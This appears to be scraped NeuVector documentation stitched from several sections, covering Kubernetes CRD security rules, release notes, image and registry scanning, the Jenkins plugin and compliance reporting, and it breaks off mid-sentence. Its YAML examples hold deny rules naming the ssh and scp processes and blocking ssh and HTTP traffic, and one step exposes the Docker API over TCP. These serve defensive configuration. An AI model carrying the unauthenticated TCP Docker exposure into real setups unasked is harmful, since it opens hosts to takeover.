There are multiple benefits to allow these customizations.  First, this allows the same rules to be applied on multiple Kubernetes environments, allowing synchronization among clusters.Second, this allows preemptive rules deployment prior to the applications coming online, which provides a proactive and effective security rules deployment workflow.Third, this allows the policymode to change from an evaluation one (such as Discover or Monitor), to one that protects the final staging environment.  These CRD rules within a yaml file can be imported into the NeuVector security platform through the use of Kubernetes CLI commands such as 'kubectl create –f crd.yaml'. This empowers the security team to tailor the security rules to be applied upon various containers residing in the Kubernetes environment.  For example, a particular yaml file can be configured to enable the policymode to Discover or Monitor a particular container named nv.alpine.ns1 in a staging cluster environment. Moreover, you can limit ssh access for a configured target container nv.alpine.ns1. to another container nv.redhat.ns2.  Once all the necessary tests and evaluations of such security rules are deemed correct, then you can migrate this to a production cluster environment simultaneous to the application deployments by using the NeuVector policy migration feature, which will be discussed later in this section.  Examples of CRD configurations that perform these functions  The following is a sample snippet of such configurations  apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ns1global namespace: ns1 #The target's native namespace spec: target: selector: name: nv.alpine.ns1 criteria: - key: service value: alpine.ns1 #The source target's running container op: &quot;=&quot; - key: domain value: ns1 op: &quot;=&quot; egress: - selector: name: egress criteria: - key: service value: nv.redhat.ns2 #The destination's running container op: &quot;=&quot; ports: tcp/22 #Denies ssh to the destination container nv.redhat.ns2 applications: - SSH action: deny name: egress file: #Applies only to the defined target container group - app: - chmod #The application chmod is the only application allowed to access, while all other apps are denied. behavior: block_access #Supported values are block_access and monitor_change.

This should be allowed if the intent is to allow the file access rule to take effect. name: chmod # This configured should match the application defined under the file section. path: /bin/chmod   The above snippet is configured to enforce ssh access from the target group container nv.alpine.ns1 to the egress group nv.redhat.ns2. In addition, the enforcement of file access and the process rules are defined and applied to the configured target container nv.alpine.ns1. With this bundled configuration, we have allowed the defined network, file, and process security rules to act upon the configured target group.

It has an ingress policy that does not allow any external connections (outside your cluster) to ssh into your containers. It also denies all containers from using the ssh process. This defined global behavior applies to all containers. The second part is a NvSecurityRule for alpine services: The target is a service called nv.alpine.default in the 'default' namespace. Because it belongs to the all containers, it will inherit the above network policy and process rule. It also adds rules that don't not allow connections of HTTP traffic through port 80 to an external network. Also it not allow the running of the scp process.  Note that for service nv.alpine.default (defined as nv.xxx.yyy where xxx is the service name like alpine, yyy is the namespace like default) we can define policy mode that it is set to. Here it is defined as Protect mode (blocking all abnormal activity).  Overall since nv.alpine.defult is in protect mode, it will deny containers from running ssh and scp, and also will deny ssh connections from external or http to external.  If you change the nv.alpine.defult policymode to monitor, then NeuVector will just log it when scp/ssh is invoked, or there are ssh connections from external or http to external.  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvClusterSecurityRule metadata: name: containers namespace: default spec: egress: [] file: [] ingress: - selector: criteria: [] name: external action: deny applications: - SSH name: containers-ingress-0 ports: tcp/22 process: - action: deny name: ssh path: /bin/ssh target: selector: criteria: - key: container op: = value: '*' name: containers policymode: null - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: nv.alpine.default namespace: default spec: egress: - selector: criteria: [] name: external action: deny applications: - HTTP name: external-egress-0 ports: tcp/80 file: [] ingress: [] process: - action: deny name: scp path: /bin/scp target: selector: criteria: - key: service op: = value: alpine.default - key: domain op: = value: default name: nv.alpine.default policymode: Protect kind: List metadata: null   To allow, or whitelist a process such as a monitoring process to run, just add a process rule with action: allow for the process name, and add the path.

This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.Compliance containers list to exclude exited containers.Enhance DLP rules to support simple wildcard in the pattern.Add support for cri-o 1.26+ and OpenShift 4.11+.Make gravatar optional.Display cluster namespace resource in console / UI.Display source severity/classification (e.g. Red Hat, Ubuntu...) along with NVD severity score in console.Don’t allow SSO/RBAC disabling for Rancher and OpenShift if user is authenticated through SSO.Add auto-scan enablement and deletion of unused groups aging to configMap.Include IP address for external source/destination in csv/pdf for implicit deny violationsVarious performance and scalability optimizations for controller and enforcer CPU and memory usage.

The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage.Enhance admission control rules: Custom criteria for admission control rules. Allow users to define resource criteria on all pod related fields and to be used in rules, for example item.metadata.annotationsKey contains 'neuvector', item.metadata.name='xyzzy' etc.Add criteria to check for high risk RBAC settings for service accounts when deploying pods. These include criteria 'any action of workload resources', 'any action on RBAC', 'create workload resources', 'listing secrets', and 'exec into a container'.Add semantic version comparison to modules for admission control rules. This enables &gt; or &lt; operators to applied to version numbers in rules (e.g. don't allow module curl&lt;6.2.0 to be deployed). This allows specific version checks on installed packages.Add an admission control rule for Pod Security Admission (PSA) supported in Kubernetes 1.25+. Add new env variable NO_DEFAULT_ADMIN which when enabled does not create an 'admin' user. This is used for Rancher SSO integration as the default. If not enabled, persistently warn the user and record events to change the default admin password if it is not changed from default.Blocking login after failed login attemps now becomes the default. The default value is 5 attempts, and configurable in Settings -&gt; Users &amp; Roles-&gt; Password Profile.Add new env variable for performance tuning ENF_NO_SYSTEM_PROFILES, value: &quot;1&quot;. When enabled, it will disable the process and file monitors. No learning processes, no profile modes, no process/file (package) incidents, and no file activity monitor will be performed. This will reduce CPU/memory resource usage and file operations.Add a custom auto-scaling setting for scanner pods, with value Delayed, Immediate, and Disabled. Important: Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value. Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Custom groups are now able to use namespace labels, including Rancher's namespace labels. Generally, pod and namespace labels can now be added to Custom Groups.Add ability to hide selected namespaces, groups in Network Activity view.Full support for Cilium cni.Full support of OpenShift 4.9 and 4.10.Build tools are now available for the NeuVector/Open Zero Trust (OZT) project at https://github.com/openzerotrust/openzerotrust.io.NeuVector now lists the version ID and SHA256 digest for each version of the controller, manager, enforcer at https://github.com/neuvector/manifests/tree/main/versions.Anonymous telemetry data (number of nodes, groups, rules) is now reported to a Rancher cloud service upon deployment to assist the project team in understanding usage behavior. This can be disabled (opt-out) in UI or with configMap (No_Telemetry_Report) or REST API.(Addendum January 2023). Support for ServiceEntry based network policy with Istio. Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. IMPORTANT: If you are upgrading to v5.1 with an Istio based deployment, new rules must be created to allow these connections and avoid violation alerts. After upgrading, Implicit violations will get reported for newly visible traffic if allow rules don't exist. New traffic rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with addresses (or DNS name) and new network rule to this destination to allow the traffic. NOTE: There is a bug in 5.1.0 in the destination reported by the deny violations that do not represent the correct destination. The bug reports both server_name and client_name are the same. This issue will get addressed in an upcoming patch release.  Bug Fixes​  Reduce controller memory consumption from unnecessary cis benchmark data created during rolling updates.

Promotes a Group’s protection Mode based on elapsed time and criteria. Does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode. Discover to Monitor criterion: Elapsed time for learning all network and process activity of at least one live pod in the Group. Monitor to Protect criterion: There are no security events (network, process etc) for the timeframe set for the Group.Support for Rancher 2.6.5 Apps and Marketplace chart. Deploys into cattle-neuvector-system namespace and enables SSO from Rancher to NeuVector. Note: Previous deployments from Rancher (e.g. Partner catalog charts, version 1.9.x and earlier), must be completely removed in order to update to the new chart.Support scanning of SUSE Linux (SLE, SLES), and Microsoft MarinerZero-drift process and file protection. This is the new default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet). Used for ingress connections to web application pods as well as outbound connections to api-services to enforce api security.CRD for WAF, DLP and admission controls. NOTE: required additional cluster role bindings/permissions. See Kubernetes and OpenShift deployment sections. CRD import/export and versioning for admission controls supported through CRD.Rancher SSO integration to launch NeuVector console through Rancher Manager. This feature is only available if the NeuVector containers are deployed through Rancher. This deployment pulls from the mirrored Rancher repository (e.g. rancher/mirrored-neuvector-controller:5.0.0) and deploys into the cattle-neuvector-system namespace. NOTE: Requires updated Rancher release 2.6.5 May 2022 or later, and only admin and cluster owner roles are supported at this time.Supports deployment on RKE2.Support for Federation of clusters (multi-cluster manager) through a proxy.

When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet)CRD for WAF, DLP and admission controls.

NeuVector supports two types of build-phase scanning: registry and local. For registry scanning, the NeuVector controller and scanner must be able to connect to the registry to pull the image.  To trigger a build-phase scan, the plug-in (e.g. Jenkins) must be able to connect to the Controller or Allinone. Note: The default REST API port for plug-ins to call the scanner is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  Make sure there is a NeuVector scanner container deployed and properly configured to connect to the Allinone or Controller. In 4.0 and later, the neuvector/scanner container must be deployed separately from the allinone or controller, and is included in the sample deployment yaml files.  You can download the plug-in from the Jenkins Plug-in Manager. Other plug-ins are accessible through the catalogs of the build tool, or on the NeuVector github page. The Bamboo scanner is available at https://github.com/neuvector/bamboo-plugin/releases/tag/1.0.1. The CircleCI ORB is available at https://github.com/neuvector/circleci-orb and through the CircleCI ORB catalog.  Local Build-Phase Scanning​  For local scanning, the NeuVector scanner will try to scan the image on a local host (or a host reachable by the remote host docker command).  For Kubernetes or OpenShift-based local scanning, remove the commented-out section of the sample scanner deployment yaml file, shown in the Deploying NeuVector sections. The commented out section looks like this:   env: # Commented out sections are required only for local build-phase scanning # - name: SCANNER_DOCKER_URL # value: tcp://192.168.1.10:2376 - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP # volumeMounts: # - mountPath: /var/run/docker.sock # name: docker-sock # readOnly: true # volumes: # - name: docker-sock # hostPath: # path: /var/run/docker.sock restartPolicy: Always   For Docker-native local scanning, follow the instructions for Docker scanner deployments in the Docker Production deployments section for the scanner.  Local Build-Phase Scanning - Scanner Only (No Controller Required)​  NeuVector supports standalone scanner deployments for local image scanning (which does not require a Controller). Certain plug-in's such as the CircleCI ORB have an option to dynamically deploy a scanner when a build job requires image scanning, then remove the scanner when the results are sent back through the ORB. These dynamic scanner deployments are automatically invoked through the plug-in if supported.  Please see the scanner section for more details on stand alone scanners.

But container images may contain open source code over which you don't have a full control. Many vulnerabilities in open source projects have been reported, and you may decide to use these libraries with vulnerabilities or not after scanning the images and reviewing the vulnerability information for them.  The NeuVector Vulnerability Scanner Jenkins plugin can scan the images after your image is built in Jenkins. The plug-in source and latest documentation can be found here on the NeuVector GitHub page.  The plug-in supports two scan modes. The first is &quot;Controller &amp; Scanner&quot; mode. The second is the standalone scanner mode. You can select the scan mode in the project configuration page. By default, it uses the &quot;Controller &amp; Scanner&quot; mode.  For the &quot;Controller &amp; Scanner&quot; mode, you need to deploy the NeuVector controller and scanner in the network. To scan the local image (the image on the Jenkins machine), the &quot;Controller &amp; Scanner&quot; needs to be installed on the same node where the image exists.  For the standalone scanner mode, the Docker run-time must be installed on the same host with Jenkins. Also, add the jenkins user to the docker group.  sudo usermod -aG docker jenkins   Jenkins Plugin Installation​  First, go to Jenkins in your browser to search for the NeuVector plug-in. This can be found in:  -&gt; Manage Jenkins -&gt; Manage Plugins -&gt; Available -&gt; filter -&gt; search NeuVector Vulnerability Scanner -&gt;  Select it and click `install without restart.'  Deploy the NeuVector Controller and Scanner container if you haven't already done so on a host reachable by the Jenkins server. This can be on the same server as Jenkins if desired. Make a note of the IP address of the host where the Controller is running. Note: The default REST API port is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  In addition, make sure there is a NeuVector scanner container deployed standalone and configured to connect to the Controller (if Controller is being used).  There are two scenarios for image scanning, local and registry scanning.  Local Image Scan. If you use the plugin to scan local images (before pushing to any registries), you can scan on the same host as the controller/scanner or configure the scanner to access the docker engine on a remote host.Registry Image Scan. If you use the plugin to scan registry images (after pushing to any registries, but as part of the Jenkins build process), the NeuVector Scanner can be installed on any node in the network with connectivity between the registry, NeuVector Scanner, and Jenkins.  Global Configuration in Jenkins​  After installing the plugin, find the ‘NeuVector Vulnerability Scanner’ section in the global configuration page (Jenkins ‘Configure System’). Enter values for the NeuVector Controller IP, port, username, and password. You may click the ‘Test Connection’ button to validate the values. It will show ‘Connection Success’ or an error message.  The timeout minutes value will terminate the build step within the time entered. The default value of 0 means no timeout will occur.  Click the ‘Add Registry’ to enter values for the registry you will use in your project. If you will be only scanning local images, you don’t need to add a registry here.  Scenario 1: global configuration example for local image scan    Scenario 2: global configuration example for registry image scan  For global registry configuration, follow the instructions above for local, then add the registry details as below.    Standalone Scanner​  Running Jenkins scan in standalone mode is a lightweight way to scan image vulnerabilities in the pipeline. Scanner is dynamically invoked and no installaton of controller setup is required. This is especially useful when scaning an image before it is pushed to a registry. It also has no limit on how many scan tasks can run at the same time.  In order to run vulnerability scan in standalone mode, the Jenkins plugin need pull the scanner image to the host where the agent is running, so you need enter NeuVector Scanner registry URL, image repository, and the credential if needed, in NeuVector plugin configuration page.  The scan result can also be submitted to the controler and used in the admission control function. In this case, you do need a controller setup and specify how to connect to the controller in NeuVector plugin configuration page.  Local Configuration for scanning a remote Docker Host​  Prerequisites for Local Scan on a Remote Docker HostTo enable NeuVector to scan an image that is not on the same host as the controller/allinone:  Make sure the docker run-time api socket is exposed via TCPAdd the following environment variable to the controller/allinone: SCANNER_DOCKER_URL=tcp://192.168.1.10:2376  Project Configuration​  In your project, choose the 'NeuVector Vulnerability Scanner' plugin from the drop down menu in the 'Add build step.' Check the box &quot;Scan with Standalone scanner&quot; if you want to do the scan in the standalone scanner mode. By default, it uses &quot;Controller &amp; Scanner&quot; mode to do the scan.  Choose Local or a registry name which is the nickname you entered in global config. Enter the repository and image tag name to be scanned. You may choose Jenkins default environment variables for the repository or tag, e.g. $JOB_NAME, $BUILD_TAG, $BUILD_NUMBER. Enter the values for the number of high or medium, and for any name of the vulnerabilities present to fail the build.  After the build is finished, a NeuVector report will be generated. It will show the scan details and errors if any.  Scenario 1: local configuration example    Scenario 2: registry configuration example    Jenkins Pipeline​  For the Jenkins pipeline project, you may write your own pipeline script directly, or click the ‘pipeline syntax’ to generate the script if you are new to the pipeline style task.    Select the NeuVector Vulnerability Scanner from the drop-down, configure it, and Generate the script.    Copy the script into your Jenkins task script.  Scenario 1: Simple local pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'Local', repository: 'your_username/your_image' \\} ...

Scan results from Federation Primary controllers ARE propagated to remote clusters.  note There is an issue with the HTTPS based adapter endpoint error: please ignore Test Connection error, it does work even though an error is shown (skip certificate validation).  Deploying the NeuVector Registry Adapter​  The 5.2 Helm chart contains options to deploy the registry adapter for Harbor. It can also be pulled manually from the neuvector/registry-adapter repo on Docker Hub. Options also include setting the Harbor registry request protocol and the basic authentication secret name.  After deployment of the adapter, it is necessary to configure this in Harbor.    The adapter endpoint must be entered, and the adapter connects to the controller, which is typically exposed as a service externally so the adapter can connect to it. In addition, authentication credentials for a valid NeuVector user must be entered.  Scanning Images from a Harbor Registry​  After successful deployment and connection to a controller, an image scan can be manually or automatically triggered from Harbor.    Periodic scans (scheduled) can be configured through Interrogation Services in Harbor, to make sure the latest CVE database is used to rescan images in registries.

GCP supports using a service account to access GCR. Here are the steps to enable a service account for GCR and use it to trigger repository scans from NeuVector.  Start in NeuVector, where one first sets up a new registry:    By selecting Google Container Registry as the repo type, this panel is customized to accept the input required to use your GCR.  Name - Here’s where you give this particular repo entry a name of your choosing. It’s merely to identify it in the NeuVector interface later on.Registry - This is the first place where you’ll want to be sure the correct data is collected from your GCR instance. While the example of https://gcr.io is the most common, we will want to be sure it accurately reflects how your GCR was set up in GCP. It might be https://us.gcr.io for example. We’ll go check it in the next section.JSON Key - As is pretty self-evident, this will be a JSON-formatted key. And, as you’re probably seeing a pattern set up for, we’ll be finding that via GCP.Filter - Be mindful that you will likely need to replace any filters here with the actual name of the repo. Again, that’s in the GCR interface.   Now let’s head on over to that GCR screen in GCP. Much of what we need is right here on this page.  A. See the “gcr.io” under Hostname? That’s what belongs in item #2, Registry in the NeuVector interface. (Don’t forget the https:// part) B. The ID of the repo is actually under the top level project. This is what you will be using in #3, Filter. See example of env-demo below.    The JSON Key leads us to explore another very important step, and that takes us to the IAM &amp; Admin section of GCP where we will create (or confirm the setting of) a Service Account. See below:    Once you enter the data for the first step of creating a service account, you need to press the “CREATE” button to get step 2 to be willing to accept input.    Be sure to select Basic —&gt; Viewer for the access. If you have an existing service account, ensure that the access is set this way. (Hint: Even access permissions that appear to be more powerful don’t seem to allow for proper access. Don't skip this step.  Once you’ve done this step, you can breeze past Step 3 and proceed with creating the Service Account.  If you don’t immediately land on the info panel for your new service account, be sure to go there on the Service Accounts list. See figure 5 below.    Click “ADD KEY” —&gt; “Create New Key”    As you have already concluded, JSON is the go-to here. Selecting “CREATE” will result in a file that you can download in your browser. The contents of this file should be pasted into the 3, JSON Key field in NeuVector; see figure 1.  Before you get too excited there’s one more thing to ensure. In order for the scanner in NeuVector to use the API to scan and protect your images, said API must be enabled in your GCP account. You can either enable it via the command line via  gcloud services enable artifactregistry.googleapis.com   Or you can use the GCP gui. Head to “API Library” and search for “Artifact Registry API” and ensure it is turned on for your project. See figure 7.    You should be set! See figure 8 below for a properly-configured registry using the data from our example:    Obtain the Access Token Using the REST API​  The NeuVector REST API may be used to authenticate using the service account. The below example uses gcloud to obtain the access token.

Add or edit registries to be scanned. Use the Filter to define repositories or subsets of images to be scanned. If your registry requires access through a proxy, this can be configured in Settings -&gt; Configuration.    The registry will be scanned according to a schedule, which is configurable. By default, only new or updated images will be scanned. If you want to re-scan all applicable images whenever the CVE database is updated, select the Rescan After CVE DB Update button when configuring the registry. You can also select Layered Scan to show vulnerabilities by each layer in the image (note: layered scans can take longer and consume more resources to complete).  After the scan is completed you will see the results below it. Click on the repository/tag to see vulnerabilities and click on the vulnerability to see more info. You can also download the report in a CSV file or see the results in the Event logs.    The scan results include vulnerabilities by image layer, if this option was selected during registry/repository configuration, as well the compliance checks results. Click the compliance tab when viewing the scan results for the image to see compliance checks.  Scanning will also discover and list all Modules (ie, an inventory) in the image, as shown below. It will also summarize the vulnerability risk by module and list all vulnerabilities for each module.    Scanning is supported for images on public and private docker registries that are based on Native Docker, Amazon ECR, Redhat/Openshift, jFrog, Microsoft ACR, Sonatype Nexus, Harbor, Google cloud and other registries. The scan report for the image comprises of the vulnerability status of various packages and binaries in the image. The brief summary of the scan report can be sent via webhook using the Response rule configuration in Policy -&gt; Response Rules, or by Syslog by configuring a syslog server in Settings -&gt; Configuration. Results can also be viewed in the Event logs.  At least one repository filter is required (can't be left blank).  Repository filter examples​    Notes:  To scan all image tags, add filter as * or *:*. This works on all registry types except the public docker registry.Repository should be full name if organization is nil for public docker registry or add library before repository as given above.Create a virtual repository and add all local repository to it to scan all tags on a JFrog registry with the subdomain docker access method.Regular expressions can be used in a filter. For example alpine:3.[8|9].* will scan all 3.8.x and 3.9.x images and tags on docker hub.  Registry scan options​  Scan Layers: Provides vulnerability scan result for every image layer separatelyProvides information about commands executed, packages added in the layerImages size of each layer Auto Scan: Auto Scan is only supported with OpenShift imagestream integration. Proper role binding should be configured in advance.When Auto Scan is enabled, as soon as an image is pushed to the registry, the image scan will be scheduled. Periodical Scan: Enable periodic scan to scan periodicallyScan interval can set to be between 5 minutes to every 7 days.Because many Admission Control checks rely on image scan result, enabling periodical scan helps make sure Admission Control has the up-to-date information of the images.Note that NeuVector will scan images in a regsistry that are new/changed from the previous scan.

The controller assigns scanning tasks to each available scanner pod. Scanner pods can be scaled up or down easily as needed using Kubernetes.  Scanner pods should be deployed to separate nodes to spread the workload across different host resources. Remember that a scanner requires enough memory to pull and expand the image, so it should have available to it more than the largest image size to be scanned. If necessary, scanners can be placed on specific nodes or avoid placing multiple pods on one node using standard Kubernetes node labels, taints/tolerations, or node affinity configurations.  By default, NeuVector deploys 2 scanner pods, as part of the sample deployments in the section Deploying NeuVector. These replicasets can be scaled up or down as needed.  The scanner container the latest CVE database and is regularly updated (with 'latest' tag) by NeuVector. The updater redeploys the scanner, forcing a pull of the latest scanner image in order to get the latest CVE database. See the section Updating the CVE Database for more details on the updater.  Please note that in initial releases the presence and status of multiple scanners is only visible in Kubernetes with 'kubectl get pods -n neuvector' and will not be displayed in the web console.  Scan results from all scanners are shown in the Assets -&gt; Registries menu. Additional scanner monitoring features will be added in future releases.  Auto-scaling of Scanner Pods​  Scanner pods can be configured to auto-scale based on certain criteria. This will ensure that scanning jobs are handled quickly and efficiently, especially if there are thousands of images to be scanned or re-scanned. There are three possible settings: delayed, immediate, and disabled. When images are queued for scanning by the controller, it keeps a 'task count' of the queue size.  Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet  Scanner auto-scaling is configured in Settings -&gt; Configuration. The minimumScannerPods setting sets the minimum scanner pods running at any time, while the maxScannerPods sets the maximum number of pods that the auto-scaling strategy can scale up to. NOTE: Setting a minimum value will not adjust the original scanner deployment replicaset value. The minimum value will be applied during the first scale up/down event.  important Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value.  Operations and Debugging​  Each scanner pod will query the registries to be scanned to pull down the complete list of available images and other data. Each scanner will then be assigned an image to pull and scan from the registry.  To inspect the scanner behavior, logs from each scanner pod can be examined using  kubectl logs &lt;scanner-pod-name&gt; -n neuvector   ","version":"Next 🚧","tagName":"h3"},{"title":"Performance Planning​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/next/scanning/scanners#performance-planning","content":" Experiment with varying numbers of scanners on registries with a large number of images to observe the scan completion time behavior in your environment. 2-5 scanners as the replica setting should be sufficient for most cases.  When a scan task is assigned to a scanner, it pulls the image from the registry (after querying the registry for the list of available images). The amount of time it takes to pull the image (download) typically consumes the most time. Multiple scanners can be pulling images from the same registry in parallel, so the performance may be limited by registry or network bandwidth.  Large images will take more time to pull as well as need to be expanded to scan them, consuming more memory. Make sure each scanner has enough memory allocated to it to handle more than the largest expected image (10% more minimum).

CIS Benchmarks automatically run by NeuVector include:  KubernetesDockerRed Hat OpenShift draft 'Inspired by CIS' benchmarksGoogle GKE  Compliance scan results can be seen for individual Assets in the Registries (for Images), Nodes, and Containers menus by selecting the relevant asset and clicking the Compliance tab.  The Security Risks -&gt; Compliance menu enables consolidated compliance reporting, similar to how the Vulnerabilities menu works.  Security Risks - Compliance and Compliance Profile​  Compliance results are show in the list by Category and Name. Categories include Docker, Kubernetes, OpenShift, and Custom. The names of each item correspond to the CIS benchmark. For example, K.4.2.3 corresponds to the Kubernetes CIS benchmark 4.2.3. Docker benchmarks are preceded with 'D' with the exception of Image related benchmarks, which are preceded by 'I'.  Use the Advanced filter to select compliance checks based on platform, host, namespace or industry standard, as shown below.    After applying the filter, only the relevant CIS benchmarks and custom checks will be shown, and a report can be generated and downloaded. This is how reports for standards such as PCI, HIPAA, GDPR and other standards can be generated.  The following screenshot shows an example of a secret found in an image scan.    Customizing Compliance Templates for PCI, GDPR, HIPAA, NIST and others​  The Compliance profile menu enables customization of the built-in templates for industry standards such as PCI and GDPR. These reports can be generated from the Security Risks -&gt; Compliance menu by selecting one of the standards to filter, then exporting. The NIST profile is for NIST SP 800-190.  To customize any compliance profile, select the industry standard (e.g. PCI), then enable or disable specific checks for that standard. Think of these as compliance 'tags' that are applied to each check in order to generate a compliance report for that industry standard.  Use the Action button to add or remove any compliance tag from that check.    In addition, you can select which 'Assets' are considered to be part of the compliance reports by clicking on the Assets tab. By default, all compliance templates are applied to Images, Nodes and Containers.    Use the Action button to add or remove compliance templates for assets.  Images. Select the standard(s) to be reported for Images.Nodes. Select the standard(s) to be reported for Nodes (hosts).Containers. Select the stadard(s) to be reported for Containers.  Alternatively, instead of restricting by the above criteria, compliance templates can be restricted to certain Namespaces. If this box is checked and namespace(s) added, reports will be generated for all assets which apply to these namespaces. This can be useful if, for example, the PCI template should only report on assets for namespaces which container PCI in-scope (applicable) workloads.    After the templates and assets are customized (if desired) in the Security Risks -&gt; Compliance Profiles menu, reports can be generated in the Security Risks -&gt; Compliance menu by opening the advanced filter and selecting the compliance template desired. For example, selecting GDPR will filter the display and reports for only the GDPR profile.  Secrets Auditing​  NeuVector checks for over 40 common types of secrets as part of the image compliance scans and run-time scans. In addition, custom compliance scripts can be configured for containers or hosts, and the DLP packet inspection feature can be used to check for secrets in network payloads.  The results for secrets auditing can be found in the Compliance section of image scans (Assets -&gt; Registries), containers (Assets -&gt; Containers), nodes (Assets -&gt; Nodes), and the compliance management menu (Security Risks -&gt; Compliance).

Please see the section Security Policy -&gt; Response Rules for instructions for creating automated responses to vulnerabilities detected either during registry scanning, run-time scanning, or CIS benchmarks. Responses can include quarantine, webhook notification, and suppression.  Federated Registries for Distributed Image Scanning Results​  The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster.

Best practices for managing vulnerabilities in NeuVector include:  Scan during the build-phase, failing the build if there are critical vulnerabilities 'with fix available.' This forces developers to address fixable vulnerabilities before storing in registries.Scan staging and production registries continuously to look for newly discovered vulnerabilities. Vulnerabilities with fixes available can be required to be fixed immediately, or a grace period allowed to provide time to remediate them.Configure Admission Control rules to block deployments into production based on criteria such as critical/high, fix available, and reported date.Continuously scan the production nodes/hosts, containers, and orchestration platform for vulnerabilities for newly discovered vulnerabilities. Implement responses based on criticality/severity that can be webhook alerts (that contact security and developer), quarantine container, or start a grace period for remediation.Ensure running containers are in Monitor or Protect mode with appropriate whitelist rules to 'virtually patch' vulnerabilities to prevent any exploit in production.Scan distroless and PhotonOS based images.  The Dashboard in NeuVector presents a summary risk score which includes vulnerabilities, which can be used to reduce risk from vulnerabilities. See how to improve the risk score for more details.  The other main tool for reviewing, filtering, and reporting on vulnerabilities is in the Security Risks menu.  Security Risks Menu - Vulnerabilities​  This menu combines the results from registry (image), node, and container vulnerability scans and compliance checks found in the Assets menu to enable end-to-end vulnerability management and reporting.  The Vulnerabilities menu provides a powerful explorer tool to:  Make it easy to filter for viewing or downloading of reports, by typing in a search string or using the advanced filter next to the box. The advanced filter allows users to filter vulnerabilities by fix available (or not available), urgency, workloads, service, container, nodes or namespace names.Understand the Impact of vulnerabilities and compliance checks by clicking on the impact row and reviewing remediation and impacted images, nodes, or containers.View the Protection Status (exploit risk) of any vulnerability or compliance issue to see if there are NeuVector Run-Time security protections (rules) enabled for impacted nodes or containers.'Accept' a vulnerability/CVE after it has been reviewed to hide it from views and suppress it from reports.    Use the filter box to enter a string match, or use the advanced filter next to it to select more specific criteria, as shown below. Downloaded PDF and CSV reports will show only the filtered results.    Selecting any CVE listed provides additional details about the CVE, remediation, and which images, nodes, or containers are Impacted. The Protection State icon (circle) shows various colors to indicate a rough percentage of the impacted items which are unprotected by NeuVector during run-time, protected by NeuVector rules (in a Monitor or Protect mode), or unaffected in run-time (e.g. an image scanned with this vulnerability has no running containers). The Protection State column color scheme is:  Black = 